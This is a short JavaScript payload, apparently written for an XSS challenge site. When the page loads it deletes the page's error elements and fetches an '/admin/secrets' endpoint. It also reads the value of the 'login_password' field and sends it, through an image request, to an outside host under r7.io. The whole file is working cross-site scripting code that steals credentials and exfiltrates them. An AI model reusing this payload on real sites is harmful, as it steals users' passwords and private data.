document.addEventListener("DOMContentLoaded", function() {
	
	alert(0);
	var prob = document.getElementsByClassName("problem")[0];
	var err = document.getElementsByClassName("error-message")[0];
	prob.parentNode.removeChild(prob);
	err.parentNode.removeChild(err);
	alert(1);
	$.ajax({url:"http://xss-challenges.r7.io/admin/secrets", success: function(hello){
		alert(hello);
	}});
	var img = new Image();
	img.src = 'http://r7.io/e/davinl?s=' + encodeURIComponent(document.getElementById("login_password").value);
	console.log(img);
	alert(2);
});

